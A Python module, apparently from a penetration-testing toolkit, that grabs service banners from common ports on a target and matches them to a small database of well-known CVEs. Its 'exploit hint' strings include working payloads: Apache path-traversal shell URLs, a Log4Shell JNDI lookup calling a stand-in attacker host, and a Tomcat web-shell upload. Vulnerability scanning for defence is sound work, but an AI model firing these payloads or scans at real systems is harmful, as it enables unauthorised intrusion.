import socket
import re
import concurrent.futures
from colorama import Fore, Style

class CVEHunter:
    def __init__(self, target):
        self.target = target
        try:
            self.ip = socket.gethostbyname(target)
        except:
            self.ip = None
            
        # DATABASE CVE (High Profile / Top Exploited)
        # Format: Regex Pattern : {CVE, Severity, Title, Exploit_Hint}
        self.vuln_db = {
            # --- FTP ---
            r"vsFTPd 2\.3\.4": {
                "cve": "CVE-2011-2523", "sev": "CRITICAL", 
                "name": "vsFTPd Backdoor Command Execution",
                "exploit": "Input ':)' in username triggers port 6200 shell"
            },
            r"ProFTPD 1\.3\.5": {
                "cve": "CVE-2015-3306", "sev": "HIGH", 
                "name": "ProFTPD mod_copy Remote Command Execution",
                "exploit": "CPFR/CPTO commands allow arbitrary file read/write"
            },
            
            # --- SSH ---
            r"OpenSSH 7\.2p2": {
                "cve": "CVE-2016-6210", "sev": "MEDIUM", 
                "name": "OpenSSH User Enumeration",
                "exploit": "Timing attack on password auth"
            },
            r"libssh 0\.[6-8]\.\d": {
                "cve": "CVE-2018-10933", "sev": "CRITICAL", 
                "name": "LibSSH Authentication Bypass",
                "exploit": "Send SSH2_MSG_USERAUTH_SUCCESS to bypass auth"
            },

            # --- WEB SERVER (Apache/Nginx/IIS) ---
            r"Apache/2\.4\.49": {
                "cve": "CVE-2021-41773", "sev": "CRITICAL", 
                "name": "Apache Path Traversal & RCE",
                "exploit": "Payload: /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"
            },
            r"Apache/2\.4\.50": {
                "cve": "CVE-2021-42013", "sev": "CRITICAL", 
                "name": "Apache Path Traversal & RCE (Bypass)",
                "exploit": "Payload: /cgi-bin/.%%32%65/.%%32%65/bin/sh"
            },
            r"Microsoft-IIS/6\.0": {
                "cve": "CVE-2017-7269", "sev": "HIGH", 
                "name": "IIS 6.0 WebDAV Buffer Overflow",
                "exploit": "Buffer overflow in PROPFIND method"
            },
            r"nginx/1\.18\.0": {
                "cve": "CVE-2021-23017", "sev": "HIGH", 
                "name": "Nginx Resolver Off-by-One",
                "exploit": "DNS poisoning attack via resolver"
            },

            # --- SSL/TLS ---
            r"OpenSSL 1\.0\.1[a-f]?": {
                "cve": "CVE-2014-0160", "sev": "CRITICAL", 
                "name": "Heartbleed",
                "exploit": "Leak memory contents via heartbeat extension"
            },

            # --- SMB / WINDOWS ---
            r"Windows.*SMB": { # Generic detection logic usually needs port 445
                "cve": "MS17-010", "sev": "CRITICAL", 
                "name": "EternalBlue (WannaCry)",
                "exploit": "Buffer overflow in SMBv1 handling"
            },

            # --- JAVA / APP SERVERS ---
            r"Apache Tomcat/9\.0\.0": {
                "cve": "CVE-2017-12615", "sev": "HIGH", 
                "name": "Tomcat RCE via JSP Upload",
                "exploit": "PUT /shell.jsp/ via DefaultServlet"
            },
            r"WebLogic 10\.3\.6": {
                "cve": "CVE-2017-10271", "sev": "CRITICAL", 
                "name": "WebLogic WLS Component RCE",
                "exploit": "XMLDecoder deserialization payload"
            },
            r"Struts 2": {
                "cve": "CVE-2017-5638", "sev": "CRITICAL", 
                "name": "Apache Struts 2 RCE (Equifax Breach)",
                "exploit": "Injection via Content-Type header"
            },
            r"Log4j": {
                "cve": "CVE-2021-44228", "sev": "CRITICAL", 
                "name": "Log4Shell",
                "exploit": "JNDI Injection: ${jndi:ldap://attacker.com/a}"
            },
            
            # --- DATABASE ---
            r"Elasticsearch 1\.4": {
                "cve": "CVE-2015-1427", "sev": "HIGH", 
                "name": "Elasticsearch Groovy Scripting RCE",
                "exploit": "Remote command execution via search script"
            }
        }

    def grab_banner(self, port):
        """Mengambil Service Banner dari Port"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.ip, port))
            
            # Trigger untuk HTTP/Generic
            if port in [80, 8080, 8000]:
                s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            
            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
            s.close()
            return banner
        except:
            return None

    def analyze_banner(self, banner, port):
        """Mencocokkan Banner dengan Database Vulnerability"""
        matches = []
        for pattern, info in self.vuln_db.items():
            if re.search(pattern, banner, re.IGNORECASE):
                matches.append(info)
        return matches

    def scan_port_and_map(self, port):
        """Worker untuk scanning"""
        banner = self.grab_banner(port)
        if banner:
            # Bersihkan banner agar rapi
            clean_banner = banner.split('\n')[0][:60]
            vulns = self.analyze_banner(banner, port)
            return (port, clean_banner, vulns)
        return None

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: CVE Mapping & Vulnerability Database{Style.RESET_ALL}")
        
        if not self.ip:
            print(f"{Fore.RED}[!] Invalid Target/Host unreachable.{Style.RESET_ALL}")
            return

        print(f"{Fore.WHITE}[*] Target IP: {Fore.GREEN}{self.ip}")
        print(f"{Fore.WHITE}[*] Scanning Ports & Mapping to {len(self.vuln_db)} known CVEs...")
        
        # Ports to scan (Common Vulnerable Ports)
        target_ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5900, 6379, 7001, 8000, 8080, 8443, 9000, 9200]
        
        print("-" * 80)
        print(f"   {'PORT':<8} | {'SERVICE BANNER':<35} | {'VULNERABILITY STATUS'}")
        print("-" * 80)

        found_vuln = False
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(self.scan_port_and_map, target_ports)
            
            for res in results:
                if res:
                    port, banner, vulns = res
                    
                    # Print Port & Banner
                    print(f"   {port:<8} | {Fore.CYAN}{banner:<35}{Style.RESET_ALL} |", end=" ")
                    
                    if vulns:
                        print(f"{Fore.RED}VULNERABLE ({len(vulns)} found){Style.RESET_ALL}")
                        found_vuln = True
                        # Print Detail CVE
                        for v in vulns:
                            sev_color = Fore.RED if v['sev'] == 'CRITICAL' else Fore.YELLOW
                            print(f"   {sev_color}└── [{v['sev']}] {v['cve']}: {v['name']}{Style.RESET_ALL}")
                            print(f"       {Fore.WHITE}Exploit Hint: {v['exploit']}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.GREEN}Clean / No Match in DB{Style.RESET_ALL}")

        print("-" * 80)
        if found_vuln:
            print(f"{Fore.RED}[!] WARNING: Target system has known exploitable vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[OK] No high-profile CVEs matched from the internal database.{Style.RESET_ALL}")

def run_cve_scan(url):
    # Extract host
    host = url.replace("http://", "").replace("https://", "").split("/")[0]
    if ":" in host: host = host.split(":")[0]
    
    engine = CVEHunter(host)
    engine.run_scan()